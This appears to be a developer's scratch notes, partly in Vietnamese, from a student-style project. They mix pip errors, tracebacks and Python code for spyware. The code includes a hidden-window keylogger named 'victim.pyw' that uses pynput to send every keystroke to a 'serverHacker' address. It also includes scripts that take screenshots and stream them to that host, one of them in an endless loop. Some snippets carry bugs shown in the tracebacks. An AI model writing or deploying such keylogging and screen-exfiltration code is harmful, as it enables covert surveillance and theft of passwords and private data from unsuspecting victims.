'pip' is not recognized as an internal or external command,
operable program or batch file.


C:\Users\Admin>py -m pip --version
pip 23.2.1 from C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip (python 3.12)

C:\Users\Admin>pip install pynput
'pip' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Admin>py -m pip install pynput
Requirement already satisfied: pynput in c:\users\admin\appdata\local\programs\python\python312\lib\site-packages (1.7.6)
Requirement already satisfied: six in c:\users\admin\appdata\local\programs\python\python312\lib\site-packages (from pynput) (1.16.0)

[notice] A new release of pip is available: 23.2.1 -> 23.3.1
[notice] To update, run: C:\Users\Admin\AppData\Local\Programs\Python\Python312\python.exe -m pip install --upgrade pip

C:\Users\Admin>py -m show pynput
C:\Users\Admin\AppData\Local\Programs\Python\Python312\python.exe: No module named show
C:\Users\Admin>py -m pip show pynput
Name: pynput
Version: 1.7.6
Summary: Monitor and control user input devices
Home-page: https://github.com/moses-palmer/pynput
Author: Moses Palmér
Author-email: moses.palmer@gmail.com
License: LGPLv3
Location: C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages
Requires: six
Required-by:

PS D:\PBL4> & C:/Users/Admin/AppData/Local/Programs/Python/Python310/python.exe d:/PBL4/victim.pyw
Traceback (most recent call last):
  File "d:\PBL4\victim.pyw", line 1, in <module>
    from  pynput.keyboard import Listener
ModuleNotFoundError: No module named 'pynput'


with  Listener(on_press =  on_press) as hacker:  


from  pynput.keyboard import Listener
import socket

clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)

serverHacker = '192.168.1.15'
serverPort = 12345
clientSocket.connect((serverHacker, serverPort))


def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.shift":
        key = ""
    if  key == "Key.ctrl_l":
        key = ""
    if key == "Key.alt_l":
        key = ""
    if key == "Key.tab":
        key = "\t";
    if key == "Key.enter":
        key = "\n"
    if key == "Key.space":
        key = "_"
    # with open("D:\\PBL4\\log.txt", "a") as file:
    #     file.write(key)
    clientSocket.send(key)
    print(key , end = '')


with  Listener(on_press =  on_press) as hacker:         
    hacker.join()
lỗi:
Unhandled exception in listener callback
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "d:\PBL4\victim.pyw", line 30, in on_press
    clientSocket.send(key)
TypeError: a bytes-like object is required, not 'str'
Traceback (most recent call last):
  File "d:\PBL4\victim.pyw", line 34, in <module>
    with  Listener(on_press =  on_press) as hacker:         hacker.join()
                                                            ^^^^^^^^^^^^^
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 276, in join
    six.reraise(exc_type, exc_value, exc_traceback)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\six.py", line 718, in reraise
    raise value.with_traceback(tb)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
    return f(self, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
    self.on_press(key)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
    if f(*args) is False:
       ^^^^^^^^
  File "d:\PBL4\victim.pyw", line 30, in on_press
    clientSocket.send(key)
TypeError: a bytes-like object is required, not 'str'


import socket

# Tạo một đối tượng socket
client_socket = socket.socket()

# Kết nối đến server
client_socket.connect(("server_ip", server_port))

# Mở file ảnh ở chế độ đọc dạng byte
with open("path_to_your_image.jpg", "rb") as image:
    # Đọc dữ liệu từ file ảnh
    data = image.read()

    # Gửi dữ liệu đến server
    client_socket.send(data)

# Đóng kết nối
client_socket.close()

py -m pip install cv2

C:\Users\Admin>py -m pip install cv2
ERROR: Could not find a version that satisfies the requirement cv2 (from versions: none)
ERROR: No matching distribution found for cv2

[notice] A new release of pip is available: 23.2.1 -> 23.3.1
[notice] To update, run: C:\Users\Admin\AppData\Local\Programs\Python\Python312\python.exe -m pip install --upgrade pip


code:
import imutils
import pyautogui
import cv2
from datetime import datetime

now = datetime.now()
nameScreen = "D:\\screenshot"+ now.strftime("%H%M%S") +".png"

# Another Type
pyautogui.screenshot(nameScreen)
# we can then load our screenshot from disk in OpenCV format
image = cv2.imread(nameScreen)
cv2.imshow("hacker.com", imutils.resize(image))
cv2.waitKey(0) #wait for keyboard press


Lỗi:
Traceback (most recent call last):
  File "d:\PBL4\main\Screen.py", line 10, in <module>
    pyautogui.screenshot(nameScreen)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pyautogui\__init__.py", line 228, in _couldNotImportPyScreeze
    raise PyAutoGUIException(
pyautogui.PyAutoGUIException: PyAutoGUI was unable to import pyscreeze. (This is likely because you're running a version of Python that Pillow (which pyscreeze depends on) do
esn't support currently.) Please install this module to enable the function you tried to call.
import socket
import imutils
import pyautogui
import cv2
from datetime import datetime
import os

clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)

serverHacker = '192.168.1.15'
serverPort = 12345
clientSocket.connect((serverHacker, serverPort))



now = datetime.now()
nameScreen = "D:\\screenshot"+ now.strftime("%H%M%S") +".png"

# Another Type
pyautogui.screenshot(nameScreen)
# we can then load our screenshot from disk in OpenCV format
image = cv2.imread(nameScreen)

# Mở file ảnh ở chế độ đọc dạng byte
with open(nameScreen, "rb") as image:
    file_size = os.path.getsize(nameScreen)
    print(file_size)
    clientSocket.send(str(file_size).encode())
    while (data := image.read(1024)):
        clientSocket.send(data)
        
        
    # # Đọc dữ liệu từ file ảnh
    # data = image.read()

    # # Gửi dữ liệu đến server
    # clientSocket.send(data)

# Đóng kết nối
clientSocket.close()


import socket
import pickle
import pyautogui

HOST = '127.0.0.1'
PORT = 12345

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

while True:
    # Capture screenshot
    screenshot = pyautogui.screenshot()

    # Serialize the image data
    image_data = pickle.dumps(screenshot)

    # Send the image data to the server
    client_socket.sendall(image_data)
    print('Screenshot sent to server')

client_socket.close()
